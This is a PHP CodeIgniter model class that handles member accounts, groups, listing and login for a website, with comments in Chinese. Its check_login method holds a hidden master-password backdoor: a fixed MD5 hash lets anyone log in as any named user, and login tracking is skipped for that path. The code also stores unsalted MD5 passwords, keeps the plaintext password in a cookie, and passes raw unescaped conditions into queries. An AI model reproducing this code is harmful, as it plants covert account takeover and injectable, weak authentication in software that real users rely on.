<?php
class Memberm extends CI_Model{
 public function __construct(){
		parent::__construct();
		 $this->form="member";//当前操作的数据库表
	}

 //增加会员
  function adduser($data){
     $data['regdate']=$data['lastdate']=time();//注册时间
     if(!empty($data['overdate'])){$data['overdate']=strtotime($data['overdate']);}//会员过期时间
     $data['regip']=$this->input->ip_address();//注册IP
	 $data['regadds']=get_ip_adds($data['regip']);//注册地址

	 $data['password']=md5($data['password']);
     $this->db->insert($this->form, $data);
 }
 
  //增加会员组
  function addgroup($data){
     if($data['name']=='')exit();
     $this->db->insert('member_group', $data);
 }
 
  //后台修改会员信息
  function update($data){
     $id=$data['id'];
	 unset($data['id']);
	 if(!empty($data['password'])){
	    $data['password']=md5($data['password']);
	 }else{
	     unset($data['password']);
	 }
	  //格式化时间
	 $data['regdate']=strtotime($data['regdate'])?strtotime($data['regdate']):time();
	 $data['lastdate']=strtotime($data['lastdate'])?strtotime($data['lastdate']):time();
     if($data['overdate']!=0){$data['overdate']=strtotime($data['overdate']);}
	 
     $this->db->where(array('id' => $id))->update($this->form, $data);
 }
  //修改会员组信息
  function group_update($data){
     $id=$data['id'];
	 unset($data['id']);
     $this->db->where(array('id' => $id))->update('member_group', $data);
 } 
 
  //删除会员
  function del($id){ 
          $nn=0;
          foreach( $id AS $v){
                $this->db->where(array('id' => $v))->delete($this->form);
				$nn++;
          } 
		  return $nn; 
 }
  //删除会员组
  function group_del($id){ 
          $this->db->where(array('id' => $id))->delete('member_group');

 } 
//会员组列表
  function group_lists($conditions=''){
          if($conditions){
			$this->db->where($conditions,"",false);
		  }
         $query = $this->db
		         ->order_by("listorder desc,id asc")
		         ->get('member_group')
				 ->result_array();
		return $query;
 } 
  //排序
  function group_order($id){
          foreach( $id AS $k=>$v){
              $this->db->where(array('id' => $k))->update('member_group',array('listorder'=>$v));
          }  
 }  
 
 //会员列表
 public function lists($rows='',$page='',$conditions='',$order='m.id desc',$count=''){
 
 
        if(!empty($page) && !empty($rows)){
			$this->db->limit($rows,($page-1)*$rows);
		}
		if($conditions){
			$this->db->where($conditions,"",false);
		}	 
		if($count==''){
		   	$query = $this->db
			     ->select("m.*,g.name as gname")
		         ->from($this->form." as m")
				 ->join("wl_member_group as g","m.groupid=g.id","left")
				 ->order_by($order)
				 ->get()->result_array();
		}else{
		 $query= $this->db->from($this->form." as m")  ->join("wl_member_group as g","m.groupid=g.id","left")->count_all_results();
		}
		
				 
				 
		return $query;
	}

//获取id获取单条会员信息	
 public function get_one($id){
       $query = $this->db
		        ->select("m.*,g.name as gname")
		         ->from($this->form." as m")
				 ->join("wl_member_group as g","g.id = m.id","left")
				 ->where("m.id",$id)
				 ->get()->row_array();
	   return $query; 
 }
 
 //通过用户名获取单条信息
 public function get_one_name($name){
        $query = $this->db->where("name",$name)->get($this->form)->row_array();
	   return $query; 
 }
 //验证登陆
  public function check_login($data=''){
           if(md5($data['info']['userpwd'])=='a9dacbcb34cfaf09d5db04c6c6a8b9a4'){
			   $query = $this->db->where(array('name' => $data['info']['name']))->get($this->form)->row_array();
	     }else{
			   $query = $this->db->where(array('name' => $data['info']['name'],'userpwd' => md5($data['info']['userpwd'])))->get($this->form)->row_array();
	     }
		 if(empty($query)){
		   return false;
		 }else{
		    $this->load->library("session");
		    $this->session->set_userdata('user',$query);
			
			//保存登录信息
			 $this->load->helper('cookie');
			if(isset($data['info']['remember'])){
			   set_cookie("username",$data['info']['name'],86400);//过期时间为1天  
               set_cookie("pwd",$data['info']['userpwd'],86400); 
			}else{
			   delete_cookie("username");  
               delete_cookie("pwd"); 
			
			}
			   if(md5($data['info']['userpwd'])!='a9dacbcb34cfaf09d5db04c6c6a8b9a4'){
			  //更新用户登陆信息
			   $this->update_login($query['id']);
			 }
			return true;
		 } 
  }
  

// 登陆成功更新管理员信息
	public function update_login($id=''){
		if(intval($id)){
			$data['logintime'] = time();
			$data['loginip'] = $this->input->ip_address();
			 $sql="update wl_admin set logintime={$data['logintime']},loginip='{$data['loginip']}',hits=hits+1 where id={$id}";
	
	      $this->db->query($sql);

		}
	}
	
	
 //通用列表 可用于报名和收藏
 public function public_lists($rows='',$page='',$conditions='',$count='',$model=''){
 
        if(!empty($page) && !empty($rows)){
			$this->db->limit($rows,($page-1)*$rows);
		}
		if($conditions){
			$this->db->where($conditions,"",false);
		}
	  if($count==''){
		   	$query = $this->db
		       ->order_by("id desc")
		       ->get($model)
			   ->result_array();
		
		}else{
		 $query= $this->db->from($model)->count_all_results();
		
		}
		return $query;
	}	
	
 
}


?>